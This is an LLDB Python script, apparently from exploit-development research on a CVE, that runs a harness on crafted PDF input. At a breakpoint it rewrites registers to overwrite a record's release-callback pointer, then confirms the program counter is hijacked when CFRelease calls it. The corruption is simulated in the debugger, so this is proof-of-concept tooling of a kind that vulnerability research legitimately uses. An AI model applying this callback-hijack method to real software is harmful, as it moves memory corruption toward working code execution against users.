# RIP-36: PC-CONTROL ENDGAME.
# marker2 -> capture g_rec (record) + rel_cb addr.
# +2540 stores (decode#2): patch x2=R+0x18, x0=rel_cb -> record callback hijacked.
# marker3 -> verify [R+0x18]==rel_cb.
# CFRelease(dp) -> data_release_info: x8==rel_cb? -> blraaz -> rel_cb EXECUTES
# ("REL_CB fired" + clean rc) = CONTROL-FLOW HIJACK CONFIRMED.
import os, sys, struct, time
import lldb
t = lldb.debugger.GetSelectedTarget()
CWD = os.getcwd()
CVE = os.path.dirname(CWD) + "/cve-2026-86950"
TRACE = open(os.path.join(CWD, "rip36_trace.txt"), "a")
def T(s): print(s, flush=True); TRACE.write(s+"\n"); TRACE.flush()
err = lldb.SBError()

def fresh():
    old = t.GetProcess()
    if old and old.IsValid() and old.GetState() in (lldb.eStateRunning, lldb.eStateStopped, lldb.eStateSuspended):
        old.Kill(); time.sleep(0.5)

def wait_stop(p, budget=30):
    p.Continue()
    st = p.GetState()
    t0 = time.time()
    while st == lldb.eStateRunning:
        if time.time() - t0 > budget:
            try: p.Stop(); time.sleep(0.5); st = p.GetState()
            except Exception: pass
            if st == lldb.eStateRunning:
                try: p.Kill()
                except Exception: pass
                return lldb.eStateKilled
            return st
        time.sleep(0.05); st = p.GetState()
    return st

def killp(p):
    try:
        if p and p.IsValid() and p.GetState() in (lldb.eStateRunning, lldb.eStateStopped, lldb.eStateSuspended):
            p.Kill()
    except Exception: pass

def safe_pc_addr(fr):
    try:
        a = fr.GetPCAddress().GetLoadAddress(t)
        if a is None or a < 0 or a >= (1 << 48): return None
        return a
    except Exception: return None

def reg(fr, name):
    r = fr.FindRegister(name)
    return r.GetValueAsUnsigned() if r and r.IsValid() else 0

def symn(fr):
    try: return fr.GetSymbol().GetName() or "?"
    except Exception: return "?"

def global_addr(name):
    for sym in t.FindGlobalVariables(name, 1):
        return sym.GetStartAddress().GetLoadAddress(t)
    return None

def func_addr(name):
    for m in t.modules:
        for s in m:
            if s.GetName() == name and s.GetType() == lldb.eSymbolTypeCode:
                return s.GetLoadAddress(t)
    sl = t.FindFunctions(name, lldb.eFunctionNameTypeAuto)
    for i in range(sl.GetSize()):
        f = sl.GetContextAtIndex(i)
        sym = f.GetSymbol()
        if sym:
            a = sym.GetStartAddress().GetLoadAddress(t)
            if a and a < (1 << 48): return a
    return None

def read_q(p, addr):
    if addr is None or addr < 0x100000: return None
    m = p.ReadMemory(addr, 8, err)
    if not err.Success() or not m: return None
    return struct.unpack('<Q', m)[0]

fresh()
b_m2 = t.BreakpointCreateByName("marker2")
b_m3 = t.BreakpointCreateByName("marker3")
b_fin = t.BreakpointCreateByName("data_release_info")
b_st = t.BreakpointCreateByName("aa_cache_render"); b_st.SetOneShot(True)
p = t.LaunchSimple(["k2_s1000.pdf", "r.png"], None, CVE)
R = None; CB = None; stores = 0; patched = 0; result = "incomplete"
if p and p.IsValid():
    th = p.GetSelectedThread()
    pc0 = safe_pc_addr(th.GetSelectedFrame())
    b_w = t.BreakpointCreateByAddress(pc0 + 2540) if pc0 else 0
    if b_w: b_w.SetOneShot(False)
    stage = 0
    for i in range(2000):
        st = wait_stop(p)
        if st != lldb.eStateStopped:
            result = "ended st=%s rc=%s" % (st, p.GetExitStatus() if p.IsValid() else -1); break
        fr = p.GetSelectedThread().GetSelectedFrame()
        nm = symn(fr)
        a2 = safe_pc_addr(fr)
        off = -1
        try:
            if fr.GetSymbol() and a2:
                off = a2 - fr.GetSymbol().GetStartAddress().GetLoadAddress(t)
        except Exception: pass
        if "marker2" in nm and stage == 0:
            R = read_q(p, global_addr("g_rec"))
            CB = func_addr("rel_cb")
            T("M2 R=%s CB=%s" % (hex(R) if R else None, hex(CB) if CB else None))
            if R and read_q(p, R + 0x18) is not None:
                T("M2 rec+0x18 pre=%x" % read_q(p, R + 0x18))
            stage = 1
            p.Continue()
        elif off == 2540 and stage >= 1 and R and CB:
            stores += 1
            x2r = fr.FindRegister("x2"); x0r = fr.FindRegister("x0")
            x2r.SetValueFromCString("0x%x" % (R + 0x18))
            x0r.SetValueFromCString("0x%x" % CB)
            patched += 1
            if patched <= 3 or patched % 50 == 0:
                T("store#%d x2->%x x0->%x" % (patched, R + 0x18, CB))
            p.Continue()
        elif "marker3" in nm:
            v = read_q(p, R + 0x18) if R else None
            T("M3 rec+0x18=%s (CB=%s) %s" % (hex(v) if v else None, hex(CB) if CB else None,
              "PATCH-LANDED" if v == CB else "patch-not-stuck"))
            stage = 2
            p.Continue()
        elif "data_release_info" in nm:
            x0 = reg(fr, "x0"); x8 = reg(fr, "x8")
            T("FIN x0=%x x8=%x %s" % (x0, x8, "HIJACKED" if CB and x8 == CB else "natural"))
            if CB and x8 == CB:
                result = "PC-HIJACK-ARMED x8=rel_cb"
            p.Continue()
        elif "rel_cb" in nm:
            T("!!! rel_cb EXECUTING — hijacked call reached !!!")
            result = "PC-CONTROL-CONFIRMED (rel_cb executed via hijacked record)"
            p.Continue()
        else:
            pc = safe_pc_addr(fr) or 0
            if CB and (pc == CB):
                T("!!! PC==rel_cb at stop off=%d !!!" % off)
                result = "PC-CONTROL-CONFIRMED pc=rel_cb"
                p.Continue()
                continue
            desc = p.GetSelectedThread().GetStopDescription(300) or ""
            if "EXC_BAD_ACCESS" in desc and CB and pc == CB:
                result = "PC-CONTROL-CONFIRMED fault-pc=rel_cb"
                T(result); killp(p); break
            p.Continue()
    killp(p)
for b in (b_m2, b_m3, b_fin, b_st, b_w):
    if b: t.BreakpointDelete(b.GetID())
T("RESULT: %s (stores=%d patched=%d)" % (result, stores, patched))
T("RIP-36 DONE")
TRACE.close()
